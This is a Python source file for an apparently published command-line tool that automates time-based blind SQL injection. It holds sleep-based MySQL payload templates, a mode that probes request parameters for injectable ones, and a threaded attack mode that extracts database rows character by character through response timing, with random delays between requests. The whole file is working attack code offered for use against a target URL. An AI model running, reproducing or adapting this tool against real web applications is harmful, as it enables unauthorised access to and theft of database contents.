import argparse, random, sys, requests
from datetime import datetime
from math import floor
from multiprocessing.dummy import Pool as ThreadPool
from time import sleep

_url = None
_payload = None         # Dictionary whose keys are the parameters of the GET/POST request.
_method = None          # Method for the request (GET/POST).
_param = None           # Vulnerable parameter to exploit.
_mode = None            # Attack mode: has a value from 0 to 3 with increasing reliability but decreasing speed.
_table = None           # Name of the table from which to select.
_column = None
_ref_resp_time = None   # Average time of a response from the page.
_time_to_sleep = None   # Time to sleep during the injections.
_threads = None         # Number of threads to create when getting multiple rows.
_max_row_length = None
_min_row_length = None

_bool_injections = {    # Injections to detect a character or the length of a row.
    "unquoted": {
        "char": "1 and 0 or if(ord(mid((select %s from %s limit %s,1), %s,1))%s, sleep(%s), sleep(0))",
        "len": "1 and 0 or if(char_length((select %s from %s limit %s,1))=%s, sleep(%s), sleep(0))"
    },
    "quoted": {
        "char": "1' and 0 or if(ord(mid((select %s from %s limit %s,1), %s,1))%s, sleep(%s), sleep(0)) -- -",
        "len": "1' and 0 or if(char_length((select %s from %s limit %s,1))=%s, sleep(%s), sleep(0)) -- -"
    }
}

_sleep_injections = {   # Injections to detect vulnerable parameters.
    "unquoted": "1 and 0 or sleep(%s)",
    "quoted": "1' or 0 or sleep(%s) -- -"
}


def _is_number(string):

    try:
        float(string)
        return True
    except ValueError:
        return False


# Returns the response time for a GET/POST requests, with the given parameters.
def _get_resp_time(payload):

    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/39.0.2171.95 Safari/537.36'
    }

    if _method == 'get':
        return requests.get(_url, params=payload, headers=headers).elapsed.total_seconds()
    elif _method == 'post':
        return requests.post(_url, data=payload, headers=headers).elapsed.total_seconds()


def _delay():

    if _mode == 0:
        sleep(random.triangular(0.1, 0.5))
    elif _mode == 1:
        sleep(random.triangular(0.3, 0.7))
    else:
        sleep(random.triangular(0.5, 0.9))


def _init_ref_resp_time():

    global _ref_resp_time

    print('[*] getting avg response time...', end="\r")
    start = datetime.now()

    pool = ThreadPool(processes=10)
    results = []        # Results obtained from the pool.
    times = []          # Response times.

    # Make 10 requests concurrently:
    for _ in range(10):
        results.append(pool.apply_async(_get_resp_time, [_payload]))

    pool.close()

    for r in results:
        times.append(r.get())

    # Remove the peaks.
    times.remove(max(times))
    times.remove(min(times))

    # Compute the average.
    _ref_resp_time = sum(times, 0.0) / len(times)

    print('[*] avg response time is %.3f sec' % _ref_resp_time, end=" ")
    print('(done in %.3f sec)' % (datetime.now() - start).total_seconds())


def _init_sleep_time():

    global _time_to_sleep

    if _mode == 0 or _mode == 1 or _mode == 2:
        _time_to_sleep = 2.5 * _ref_resp_time
    elif _mode == 3:
        _time_to_sleep = 5.5 * _ref_resp_time
    else:
        _time_to_sleep = 8.0 * _ref_resp_time


# Returns the character at index 'index', or None if not found.
def _get_char(row, index):

    (min_index, mid_index, max_index) = (32, None, 126)

    # Copy the payload in a temporary dictionary.
    params = dict(_payload)

    if _is_number(_payload[_param]):
        injection = _bool_injections["unquoted"]["char"]
    else:
        injection = _bool_injections["quoted"]["char"]

    # Binary-search:
    while min_index <= max_index:

        mid_index = floor((max_index + min_index) / 2)

        # Prepare the injections for the parameter 'param'.
        eq_injection = injection % (_column, _table, row, index, '=' + str(mid_index), str(_time_to_sleep))
        gt_injection = injection % (_column, _table, row, index, '>' + str(mid_index), str(_time_to_sleep))

        # Make the comparisons concurrently.
        pool = ThreadPool(processes=2)

        params[_param] = eq_injection

        eq_result = pool.apply_async(_get_resp_time, [params])

        _delay()

        params[_param] = gt_injection

        gt_result = pool.apply_async(_get_resp_time, [params])

        pool.close()

        # Check if the first test is true:
        eq_time = eq_result.get()

        if eq_time >= _time_to_sleep:
            char = chr(int(mid_index))
            return char

        gt_time = gt_result.get()

        if gt_time >= _time_to_sleep:
            min_index = mid_index + 1
        else:
            max_index = mid_index - 1

        _delay()

    # Return None if the character is not found.
    return None


def _get_row_length(row):

    params = dict(_payload)

    if _is_number(_payload[_param]):
        injection = _bool_injections["unquoted"]["len"]
    else:
        injection = _bool_injections["quoted"]["len"]

    length = None

    loop = True                     # If false the while loop ends.
    iteration = 0
    test_length = _min_row_length   # Length currently testing.
    while test_length <= _max_row_length and loop:

        # Make 'n' tests concurrently.
        n = 1 if (_max_row_length - _min_row_length) < 10 else 10
        pool = ThreadPool(processes=n)

        results = []

        print('[*] getting row', row, 'length', end='\r')

        for j in range(n):
            # Erase the line.
            sys.stdout.write("\033[K")
            print('[*] getting row', row, 'length' + '.' * (j % 4), end='\r')
            params[_param] = injection % (_column, _table, row, str(test_length), str(_time_to_sleep))
            results.append(pool.apply_async(_get_resp_time, [params]))
            _delay()
            test_length += 1

        pool.close()

        for j in range(len(results)):
            # When the length is found, break the loop.
            if results[j].get() > _time_to_sleep:
                loop = False
                length = _min_row_length + j + n * iteration

        iteration += 1

    sys.stdout.write("\033[K")

    # Check if the row is empty.
    if length is None:
        return 0

    return length


# Returns the rows from row to (row + rows).
# Searches '_threads' rows at once.
def _get_rows(row, rows):

    start = datetime.now()

    values = []     # Values found.

    i = row
    while i < row + rows:

        time = datetime.now()

        rows_lengths = []
        results = []            # Results of the pool.
        progress = []           # List of chars found as far. Can be safely filled by the threads because the 'append'
                                # is a thread-safe operation.

        pool = ThreadPool(processes=_threads)
        pool_index = i

        for _ in range(_threads):
            results.append(pool.apply_async(_get_row_length, [pool_index]))
            pool_index += 1

        pool_index = i
        for j in range(len(results)):
            length = results[j].get()
            rows_lengths.append(length)
            if length == 0:
                print('[*] row', pool_index, 'seems to be empty')
            else:
                print('[*] row', pool_index, 'length is', length)
            pool_index += 1

        results = []
        total = sum(rows_lengths)    # Total number of chars to find.

        for j in range(_threads):
            results.append(pool.apply_async(_get_row, [i, rows_lengths[j], progress, total]))
            i += 1

        for r in results:
            values.append(r.get())

        pool.close()

        print('(%.3f sec)' % (datetime.now() - time).total_seconds())

        if rows > _threads:
            print('> RESULTS (as far):')
            for v in values:
                if v == '':
                    print('[empty]')
                else:
                    print(v)

    print('> RESULTS:')
    for v in values:
        if v == '':
            print('[empty]')
        else:
            print(v)

    print('[*] all done in %.3f sec' % (datetime.now() - start).total_seconds())


def _get_row(row, length, progress, total):

    # Call _get_char(.) for each index:
    value = ''
    for i in range(length):
        _delay()
        char = _get_char(row, i + 1)
        if char is None:
            # A character not recognized is replaced by '?'.
            value += '?'
        else:
            value += str(char)
        # Progress is the list of chars found as far. It's used to know the percentage of work done so far.
        progress.append(char)
        prefix = '[*] getting ' + str(_threads) + ' ' + ('rows' if _threads > 1 else 'row') + ':'
        print_progress(len(progress), total, prefix=prefix, suffix='complete', endl=False)

    return value


def _is_param_vulnerable(param):

    params = dict(_payload)

    if _is_number(_payload[param]):
        injection = _sleep_injections["unquoted"] % (str(_time_to_sleep))
    else:
        injection = _sleep_injections["quoted"] % (str(_time_to_sleep))

    params[param] = injection

    if _get_resp_time(params) > _time_to_sleep:
        return True
    else:
        return False


def print_progress(iteration, total, prefix='', suffix='', decimals=1, bar_length=40, endl=True):

    str_format = "{0:." + str(decimals) + "f}"
    percents = str_format.format(100 * (iteration / float(total)))
    filled_length = int(round(bar_length * iteration / float(total)))
    bar = '█' * filled_length + '-' * (bar_length - filled_length)

    sys.stdout.write('\r%s |%s| %s%s %s' % (prefix, bar, percents, '%', suffix)),

    if endl and iteration == total:
        sys.stdout.write('\n')
    else:
        sys.stdout.write(' ')
    sys.stdout.flush()


print("  _     _ _           _       _      ")
print(" | |   | (_)         | |     (_)     ")
print(" | |__ | |_ _ __   __| |_ __  _  ___ ")
print(" | '_ \| | | '_ \ / _` | '_ \| |/ _ \\")
print(" | |_) | | | | | | (_| | |_) | |  __/")
print(" |_.__/|_|_|_| |_|\__,_| .__/|_|\___|")
print("                       | |           ")
print("                       |_|           ")
print()

# Parse the command line arguments:
parser = argparse.ArgumentParser(
    description='A simple tool to automate time-based blind SQL injections.',
    epilog='Note: the default values must be of the same type of data of the parameters (use numbers for the parameters'
           ' which are numbers, strings otherwise).'
)

parser.add_argument(
    '-u',
    '--url',
    type=str,
    help='url of the target',
    required=True
)

parser.add_argument(
    '-p',
    '--params',
    nargs='+',
    type=str,
    help='parameters for the requests',
    required=True
)

parser.add_argument(
    '-d',
    '--default',
    nargs='+',
    type=str,
    help='default values for the parameters',
    required=True
)

group0 = parser.add_mutually_exclusive_group(required=True)
group0.add_argument(
    '--post',
    action='store_true',
    help='use method POST'
)
group0.add_argument(
    '--get',
    action='store_true',
    help='use method GET'
)

parser.add_argument(
    '-M',
    type=int,
    help='attack mode (from 0, the least reliable but the fastest, to 4, the most reliable but the slowest)'
)

parser.add_argument(
    '-T',
    type=int,
    help='number of threads to create when getting multiple rows'
)

subparsers = parser.add_subparsers()

subparser0 = subparsers.add_parser(
    'test'
)
subparser0.add_argument(
    '--test',
    action='store_true',
    help='test for vulnerabilities',
    required=True
)

subparser1 = subparsers.add_parser(
    'attack'
)
subparser1.add_argument(
    '--param',
    type=str,
    help='vulnerable parameter to exploit',
    required=True
)
subparser1.add_argument(
    '--table',
    type=str,
    help='name of the table from which to select',
    required=True
)
subparser1.add_argument(
    '--column',
    type=str,
    help='name of the column to select',
    required=True
)
subparser1.add_argument(
    '--row',
    type=int,
    help='index of the row to select',
    required=True
)
subparser1.add_argument(
    '--rows',
    type=int,
    help='number of rows to select'
)
subparser1.add_argument(
    '--max_length',
    type=int,
    help='max length of a selected row'
)
subparser1.add_argument(
    '--min_length',
    type=int,
    help='min length of a selected row'
)

args = parser.parse_args()


# Check the command line arguments:
if len(args.default) != len(args.params):
    parser.error('invalid number of default values')
    exit(-1)

if ('param' in args) and (args.param is not None) and (args.param not in args.params):
    parser.error('invalid parameter value')
    exit(-1)

if ('T' in args) and (args.T is not None) and args.T < 1:
    parser.error('invalid number of threads')
    exit(-1)

if ('T' in args) and ('rows' in args) and (args.T is not None) and (args.rows is None):
    print('Note: if the number of rows is 1 the number of threads is set to 1')

if ('M' in args) and (args.M is not None) and (args.M > 4 or args.M < 0):
    parser.error('invalid attack mode value')
    exit(-1)

if ('max_length' in args) and (args.max_length is not None) and (args.max_length <= 0):
    parser.error('invalid max row length value')
    exit(-1)

if ('min_length' in args) and (args.min_length is not None) and (args.min_length < 0):
    parser.error('invalid min row length value')
    exit(-1)

# Initialize the global variables:
_url = args.url
_payload = dict(zip(args.params, args.default))
_method = 'post' if args.post else 'get'
if 'T' in args and args.T is not None:
    _threads = args.T
else:
    _threads = 1
if 'M' in args and args.M is not None:
    _mode = args.M
else:
    _mode = 3
if 'max_length' in args and args.max_length is not None:
    _max_row_length = args.max_length
else:
    _max_row_length = 128
if 'min_length' in args and args.min_length is not None:
    _min_row_length = args.min_length
else:
    _min_row_length = 0
_init_ref_resp_time()
_init_sleep_time()

# Test for vulnerabilities, or attack:
if ('test' in args) and (args.test is True):
    time = datetime.now()
    flags = []
    for i in range(len(args.params)):
        flags.append(_is_param_vulnerable(args.params[i]))
        print_progress(i + 1, len(args.params), prefix='[*] testing params:', suffix='complete')
    print('> RESULTS:')
    for i in range(len(args.params)):
        if flags[i]:
            print('[*]', args.params[i], 'seems to be vulnerable')
        else:
            print('[*]', args.params[i], 'doesn\'t seem to be vulnerable')
    print('[*] all done in %.3f sec' % (datetime.now() - time).total_seconds())
    exit(0)
else:
    _param = args.param
    _table = args.table
    _column = args.column
    if args.rows is not None:
        _get_rows(args.row, args.rows)
    else:
        _threads = 1
        _get_rows(args.row, 1)
    exit(0)
